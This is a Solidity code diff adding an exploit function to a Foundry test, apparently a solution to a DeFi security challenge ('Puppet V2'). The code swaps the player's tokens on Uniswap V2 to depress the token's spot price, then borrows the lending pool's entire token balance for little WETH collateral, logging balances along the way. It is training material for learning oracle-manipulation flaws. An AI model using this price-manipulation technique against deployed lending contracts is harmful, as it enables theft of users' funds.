@@ -81,6 +81,36 @@ contract PuppetV2Test is Test {
     function exploit() public {
         vm.startPrank(player);
 
+        // approve the router for the tokens
+        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
+        emit log("before");
+        emit log_named_decimal_uint("token", token.balanceOf(player), 18);
+        emit log_named_decimal_uint("weth", weth.balanceOf(player), 18);
+        emit log_named_decimal_uint("eth", address(player).balance, 18);
+        uint256 beforeCollateral = puppetV2pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        emit log_named_decimal_uint("collateral", beforeCollateral, 18);
+        // swap tokens for WETH
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+        uniswapV2Router.swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, 0, path, player, DEADLINE);
+        emit log("after");
+        emit log_named_decimal_uint("token", token.balanceOf(player), 18);
+        emit log_named_decimal_uint("weth", weth.balanceOf(player), 18);
+        emit log_named_decimal_uint("eth", address(player).balance, 18);
+
+        // calculate deposit required
+        uint256 afterCollateral = puppetV2pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        emit log_named_decimal_uint("collateral", afterCollateral, 18);
+        weth.deposit{value: player.balance}();
+        emit log_named_decimal_uint("weth", weth.balanceOf(player), 18);
+        weth.approve(address(puppetV2pool), afterCollateral);
+        puppetV2pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        emit log("after hack");
+        emit log_named_decimal_uint("token", token.balanceOf(player), 18);
+        emit log_named_decimal_uint("weth", weth.balanceOf(player), 18);
+        emit log_named_decimal_uint("eth", address(player).balance, 18);
+
         vm.stopPrank();
     }
 
